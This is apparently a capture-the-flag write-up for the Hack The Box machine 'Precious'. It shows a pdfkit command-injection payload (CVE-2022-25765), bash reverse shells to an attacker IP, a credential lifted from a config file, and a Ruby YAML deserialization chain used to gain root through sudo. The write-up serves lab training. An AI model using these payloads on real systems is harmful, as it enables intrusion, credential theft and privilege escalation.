# Precious

---

## Enumeration

- nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- website redirects to domain name: `precious.htb`, converter HTML to PDF
- Tested a pdf file, the server is using `pdfkit v0.8.6`

```bash 
exiftool uembazl7c5psymbnll7oad4y0glo8hp0.pdf 

...

Creator                         : Generated by pdfkit v0.8.6
```

- Vulnerable to [CVE-2022-25765](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)

---

## Foothold

### PoC

- Tried the payload: ```http://10.10.16.18/?name=#{'%20`curl 10.10.16.18`'}``` and I got the response:

```bash
nc -lvnp 9000    

listening on [any] 9000 ...
connect to [10.10.16.18] from (UNKNOWN) [10.129.255.108] 44900
GET / HTTP/1.1
Host: 10.10.16.18:9000
User-Agent: curl/7.74.0
Accept: */*

```

- Now I set up a payload and got a reverse shell

### Payload:

```zsh
┌──(kali㉿kali)-[~/CTF/HTB-CTF/Machines/Precious]
└─$ nano shell.sh      
                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB-CTF/Machines/Precious]
└─$ cat shell.sh                            
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.18/9001 0>&1
--------------------------------
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001                                      
listening on [any] 9001 ...

```

### On the victim machine:

- Sent the payload as: ```http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.16.18/1337 0>&1"`'}```

```zsh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.18] from (UNKNOWN) [10.129.200.179] 56842
bash: cannot set terminal process group (675): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ which nc
which nc
ruby@precious:/var/www/pdfapp$ which python
which python
ruby@precious:/var/www/pdfapp$ which python3
which python3
/usr/bin/python3
ruby@precious:/var/www/pdfapp$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
ruby@precious:/var/www/pdfapp$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg                          
[1]  + continued  nc -lvnp 1337

ruby@precious:/var/www/pdfapp$ export TERM=xterm-256color
ruby@precious:/var/www/pdfapp$ 
```

---

## Lateral Movement

- User flag was under `henry`'s account.
- After some enumeration on the file system found `.bundle` folder that had Henry's creds:

```bash
ruby@precious:~$ ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 Nov 26 16:59 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Nov 26 16:59 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
ruby@precious:~$ cd .bundle/
ruby@precious:~/.bundle$ ls
config
ruby@precious:~/.bundle$ cat config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
ruby@precious:~/.bundle$ su henry
Password: 
henry@precious:/home/ruby/.bundle$ 

```

---

## Privilege Escalation

- After some enumeration, found that user `Henry` can run the following command using `sudo` as root:

```bash
henry@precious:/tmp/pwn$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

- Found a deserialization attack on `update_dependencies.rb` and the file being called in `YAML.load` is being called using relative path!
- https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

## PoC

- `dependencies.yml` file:

```yaml
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "curl http://10.10.16.18"
         method_id: :resolve
```

- Victim machine:

```bash
henry@precious:/tmp/pwn$ sudo /usr/bin/ruby /opt/update_dependencies.rb
```

- Attacking machine:

```zsh
nc -lvnp 80  
listening on [any] 80 ...
connect to [10.10.16.18] from (UNKNOWN) [10.129.200.179] 37634
GET / HTTP/1.1
Host: 10.10.16.18
User-Agent: curl/7.74.0
Accept: */*
```

- To get root access, I modified the payload to execute `chmod +s /bin/bash`.

```bash
henry@precious:/tmp/pwn$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
henry@precious:/tmp/pwn$ sudo /usr/bin/ruby /opt/update_dependencies.rb 

<--SNIP-->

henry@precious:/tmp/pwn$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
henry@precious:/tmp/pwn$ bash -p
bash-5.1# whoami
root

```

---
